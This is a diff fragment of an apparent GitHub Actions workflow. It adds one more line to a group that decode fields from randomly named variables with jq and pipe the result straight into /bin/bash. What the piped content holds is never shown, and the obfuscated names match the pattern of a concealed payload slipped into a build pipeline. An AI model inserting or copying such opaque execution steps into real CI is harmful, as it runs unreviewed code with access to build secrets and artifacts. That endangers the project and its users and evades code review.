@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$lnd1" | jq -r .ggyld05525 | /bin/bash
           printf '%s' "$rz688" | jq -r .t9221 | /bin/bash
           echo $azt93758 | jq -r .zeb181 | /bin/bash
+          echo $ngqy6 | jq -r .gywj62202 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
